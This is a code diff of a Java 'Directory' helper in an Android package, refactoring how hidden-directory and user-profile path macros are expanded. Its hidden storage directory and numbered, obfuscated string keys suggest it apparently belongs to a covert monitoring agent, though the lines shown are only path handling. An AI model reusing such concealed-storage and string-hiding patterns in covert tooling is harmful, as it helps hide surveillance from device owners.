@@ -23,37 +23,33 @@ import com.android.service.util.Utils;
 public class Directory {
 	/** The debug. */
 	private static final String TAG = "Directory"; //$NON-NLS-1$
-	/** The hidden dir macro. */
-	public static String hiddenDirMacro = Messages.getString("23.0"); //$NON-NLS-1$
 
-	private Directory() {
+	/** The hidden dir macro. */
+	public final static String hiddenDirMacro = Messages.getString("23.0"); //$NON-NLS-1$
+	public final static String userProfile = Messages.getString("23.1"); //$NON-NLS-1$
+
+	public static String expandMacro(String file) {
+		// expanding $dir$ && $userprofile$
+
+		file = Directory.expandMacro(file, hiddenDirMacro, Path.hidden());
+		file = Directory.expandMacro(file, userProfile, Path.home());
+		return file;
 	}
 
-	/**
-	 * Expand macro.
-	 * 
-	 * @param filename
-	 *            the filename
-	 * @return the string
-	 */
-	public static String expandMacro(final String filename) {
-		final int macro = filename.indexOf(hiddenDirMacro, 0);
+	private static String expandMacro(String filename, String expand, String newdir) {
+		final int macro = filename.indexOf(expand, 0);
 		String expandedFilter = filename;
-
-		if (macro >= 0) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " expanding macro");//$NON-NLS-1$
-			}
+		if (macro == 0) {
 
 			// final String first = filter.substring(0, macro);
-			final String end = filename.substring(macro + hiddenDirMacro.length(), filename.length());
-			expandedFilter = Utils.chomp(Path.hidden(), "/") + end; // Path.UPLOAD_DIR
-		}
+			final String end = filename.substring(macro + expand.length(), filename.length());
+			expandedFilter = Utils.chomp(newdir, "/") + end; //$NON-NLS-1$
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " expandedFilter: " + expandedFilter);
-		}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (expandMacro) expandedFilter: " + expandedFilter);
+			}
 
+		}
 		return expandedFilter;
 	}
 
@@ -85,7 +81,6 @@ public class Directory {
 		return expandedFilter;
 	}
 
-	// TODO
 	/**
 	 * Find.
 	 * 
